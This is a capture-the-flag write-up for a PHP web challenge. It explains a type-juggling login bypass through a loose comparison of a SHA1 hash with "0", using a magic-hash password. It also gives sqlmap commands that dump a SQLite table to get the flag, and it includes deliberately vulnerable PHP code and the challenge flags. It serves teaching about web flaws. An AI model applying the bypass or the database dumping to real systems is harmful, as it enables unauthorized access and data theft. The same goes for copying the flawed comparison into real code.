# why-are-types-weird

## DESCRIPTION
> Jacob is making a simple website to test out his PHP skills. He is certain that his website has absolutely zero security issues.  
Find out the fatal bug in his website.  
**FLAG FORMAT**:
dsc{[a-zA-Z0-9_]+}


## Solution:
* Look at `source.php`
```php
<?php
if (isset($_GET['but_submit'])) {
    $username = $_GET['txt_uname'];
    $password = $_GET['txt_pwd'];
    if ($username !== "admin") {
        echo "Invalid username";
    } else if (hash('sha1', $password) == "0") {
        session_start();
        $_SESSION['username'] = $username;
        header("Location: admin.php");
    } else {
        echo "Invalid password";
    }
}
```
* As we can see there is a strict comparison`=== / !==` happening for the username and loose comparison`==/!=` happening for password 

|Loose Comparison|Strict Comparison|
|---|---|
|**Only value** is checked and **NOT** the type of the variable|Both **value** and **Type** are checked|
|**==** or **!=** | **===** or **!==**|
* [Read here on Type Juggling in PHP](https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4)
* If we look closely at the source code we can see that there is a loose comparison (==) between the SHA1 hash and 0, we can exploit this comparison.
* So somehow we need to find a value whose SHA1 hash value starts with `0e`
* I used this [Git repository](https://github.com/spaze/hashes/blob/master/sha1.md) to find the SHA1 hash 
* `admin:aaroZmOk`
* We are able to login with the above credentials
* We can enter different ids in the box and we get some credentials but they are of no use
* From id we get username and passwords
	* `user1:password1`
	* `user2:password123`
	* `amitheadmin:dsc{n0_1m_n0t_th3_4dm1n}`
* My next thought was to use `sqlmap`
* Capture request using burpsuite
* Save the request to a `.raw` file
* Enumerate using `sqlmap`
* Commands:
	* `sqlmap -r request.raw --dbms=SQLite --tables`
	* `sqlmap -r request.raw --dbms=SQLite -T power_users`
	* `sqlmap -r request.raw --dbms=SQLite -T power_users --dump`  
* We get the flag in the `power_users` table
* FLAG:  
`dsc{tYp3_juGgl1nG_i5_cr4zY}`

## Resources:
- https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4
- https://github.com/spaze/hashes/blob/master/sha1.md
